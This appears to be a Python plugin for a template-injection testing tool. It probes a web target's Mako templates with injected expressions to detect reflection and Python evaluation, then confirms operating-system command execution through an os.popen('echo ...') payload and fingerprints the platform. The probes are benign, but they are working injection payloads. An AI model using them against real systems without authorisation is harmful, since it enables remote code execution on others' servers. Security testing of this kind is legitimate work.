from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Mako(Check):
    
    def init(self):
        
        # Declare payload
        self.base_tag = '${%s}'
        
        # Skip reflection check if same tag has been detected before
        if self.get('reflect_tag') != self.base_tag:
            self._check_reflection()
        
            # Return if reflect_tag is not set
            if not self.get('reflect_tag'):
                return
                
            log.warn('Reflection detected with tag \'%s\'' % self.get('reflect_tag'))
        
        self._check_python()
            
        if not self.get('language') or  not self.get('engine'):
            return
            
        log.warn('Python injection detected')   
        
        self._check_os()
        
        if not self.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.get('os', 'undetected')
            )
        )

    def _check_python(self):
        
        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)
        
        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)
        
        if expected == self.req(payload):
            self.set('language', 'python')
            self.set('engine', 'mako')
    
    def _check_reflection(self):
        
        randA = rand.randint_n(1)
        randB = rand.randint_n(1)

        payload = '${%i*%i}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflect_tag', self.base_tag)
        
    def _check_os(self):
        
        expected_rand = str(rand.randint_n(2))
        payload = """<%%
        import os
        x=os.popen('echo %s').read()
        %%>${x}""" % expected_rand
                
        if expected_rand == self.req(payload):
            self.set('exec', True)      

        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
                
        self.set('os', self.req(payload))